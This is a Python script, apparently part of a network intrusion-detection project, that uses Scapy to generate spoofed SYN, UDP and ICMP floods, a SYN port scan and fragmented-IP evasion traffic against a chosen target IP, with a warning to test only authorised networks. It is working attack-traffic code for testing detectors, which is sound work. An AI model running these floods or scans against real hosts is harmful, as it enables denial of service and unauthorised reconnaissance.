"""
inject.py
---------
Anomaly Injection Module — simulates various attack traffic patterns
using Scapy to stress-test the detection pipeline.

Simulated attacks:
  1. TCP SYN Flood      (DoS)
  2. UDP Flood          (DoS)
  3. ICMP Flood / Ping Storm
  4. Port Scan          (reconnaissance)
  5. Fragmented IP      (evasion technique)

⚠  WARNING: Only use on networks you own or have explicit written permission
   to test. Sending spoofed/attack traffic on public networks is illegal.
"""

import time
import random
import sys

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, Raw, send, RandShort, RandIP,
        fragment, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[ERROR] Scapy not installed. Run: pip install scapy")
    sys.exit(1)

# Suppress Scapy warnings
conf.verb = 0

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _rand_src() -> str:
    """Generate a random source IP (RFC 1918 range to avoid leaving the LAN)."""
    return f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"


def _banner(title: str):
    print(f"\n{'─'*55}")
    print(f"  INJECTING: {title}")
    print(f"{'─'*55}")


# ─────────────────────────────────────────────────────────────────────────────
# 1. TCP SYN Flood
# ─────────────────────────────────────────────────────────────────────────────

def tcp_syn_flood(target_ip: str, target_port: int = 80, count: int = 100,
                  inter: float = 0.005):
    """
    Send `count` TCP SYN packets with spoofed source IPs.
    Simulates a classic SYN-flood DoS attack.
    """
    _banner(f"TCP SYN Flood → {target_ip}:{target_port}  ({count} pkts)")
    for i in range(count):
        pkt = (
            IP(src=_rand_src(), dst=target_ip) /
            TCP(sport=RandShort(), dport=target_port, flags="S") /
            Raw(b"X" * random.randint(0, 64))
        )
        send(pkt, verbose=False)
        if i % 20 == 0:
            print(f"  [SYN Flood] Sent {i+1}/{count} packets …")
        time.sleep(inter)
    print(f"  [SYN Flood] Done — {count} packets sent.")


# ─────────────────────────────────────────────────────────────────────────────
# 2. UDP Flood
# ─────────────────────────────────────────────────────────────────────────────

def udp_flood(target_ip: str, target_port: int = 53, count: int = 100,
              inter: float = 0.005):
    """
    Send `count` large UDP packets to exhaust bandwidth / connection tables.
    """
    _banner(f"UDP Flood → {target_ip}:{target_port}  ({count} pkts)")
    payload = b"A" * 512
    for i in range(count):
        pkt = (
            IP(src=_rand_src(), dst=target_ip) /
            UDP(sport=RandShort(), dport=target_port) /
            Raw(payload)
        )
        send(pkt, verbose=False)
        if i % 20 == 0:
            print(f"  [UDP Flood] Sent {i+1}/{count} packets …")
        time.sleep(inter)
    print(f"  [UDP Flood] Done — {count} packets sent.")


# ─────────────────────────────────────────────────────────────────────────────
# 3. ICMP Flood (Ping Storm)
# ─────────────────────────────────────────────────────────────────────────────

def icmp_flood(target_ip: str, count: int = 100, inter: float = 0.005):
    """Rapid ICMP echo-request flood (Smurf-style)."""
    _banner(f"ICMP Flood → {target_ip}  ({count} pkts)")
    for i in range(count):
        pkt = IP(src=_rand_src(), dst=target_ip) / ICMP() / Raw(b"Z" * 56)
        send(pkt, verbose=False)
        if i % 20 == 0:
            print(f"  [ICMP Flood] Sent {i+1}/{count} packets …")
        time.sleep(inter)
    print(f"  [ICMP Flood] Done — {count} packets sent.")


# ─────────────────────────────────────────────────────────────────────────────
# 4. Port Scan (reconnaissance)
# ─────────────────────────────────────────────────────────────────────────────

def port_scan(target_ip: str, ports: list = None, inter: float = 0.02):
    """
    Send SYN packets to a range of ports to simulate reconnaissance.
    Default: common ports 20–1024.
    """
    if ports is None:
        ports = list(range(20, 1025))

    _banner(f"Port Scan → {target_ip}  ({len(ports)} ports)")
    src = _rand_src()
    for i, port in enumerate(ports):
        pkt = IP(src=src, dst=target_ip) / TCP(dport=port, flags="S")
        send(pkt, verbose=False)
        if i % 100 == 0:
            print(f"  [Port Scan] Scanned {i+1}/{len(ports)} ports …")
        time.sleep(inter)
    print(f"  [Port Scan] Done — {len(ports)} ports scanned.")


# ─────────────────────────────────────────────────────────────────────────────
# 5. Fragmented IP Attack (evasion)
# ─────────────────────────────────────────────────────────────────────────────

def fragmented_attack(target_ip: str, target_port: int = 80, count: int = 50,
                      inter: float = 0.01):
    """
    Send oversized, fragmented IP packets to evade naive IDS filters.
    """
    _banner(f"Fragmented IP → {target_ip}:{target_port}  ({count} pkts)")
    for i in range(count):
        big_payload = Raw(b"B" * 2000)
        pkt = IP(src=_rand_src(), dst=target_ip) / TCP(dport=target_port, flags="S") / big_payload
        frags = fragment(pkt, fragsize=512)
        for frag in frags:
            send(frag, verbose=False)
        if i % 10 == 0:
            print(f"  [Fragmented] Sent {i+1}/{count} fragmented packets …")
        time.sleep(inter)
    print(f"  [Fragmented] Done — {count} fragmented bursts sent.")


# ─────────────────────────────────────────────────────────────────────────────
# 6. Full injection suite
# ─────────────────────────────────────────────────────────────────────────────

def run_all_attacks(target_ip: str = "192.168.1.6", pkt_count: int = 50):
    """
    Run all attack simulations sequentially against `target_ip`.
    Use a small packet count for quick smoke-testing.
    """
    print(f"\n[INJECT] Starting full attack suite against {target_ip}")
    print("[INJECT] ⚠  Ensure you have permission to test this host.\n")

    tcp_syn_flood(target_ip, count=pkt_count)
    udp_flood(target_ip, count=pkt_count)
    icmp_flood(target_ip, count=pkt_count)
    port_scan(target_ip, ports=list(range(20, 20 + pkt_count)))
    fragmented_attack(target_ip, count=max(pkt_count // 5, 10))

    print("\n[INJECT] All attack simulations complete.")


# ─────────────────────────────────────────────────────────────────────────────
# Entry Point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Network Anomaly Injection Tool")
    parser.add_argument("--target", default="192.168.1.6", help="Target IP address")
    parser.add_argument("--count",  type=int, default=50, help="Packets per attack type")
    parser.add_argument("--attack", choices=["syn", "udp", "icmp", "scan", "frag", "all"],
                        default="all", help="Which attack to simulate")
    args = parser.parse_args()

    if args.attack == "syn":
        tcp_syn_flood(args.target, count=args.count)
    elif args.attack == "udp":
        udp_flood(args.target, count=args.count)
    elif args.attack == "icmp":
        icmp_flood(args.target, count=args.count)
    elif args.attack == "scan":
        port_scan(args.target, ports=list(range(20, 20 + args.count)))
    elif args.attack == "frag":
        fragmented_attack(args.target, count=args.count)
    else:
        run_all_attacks(args.target, args.count)
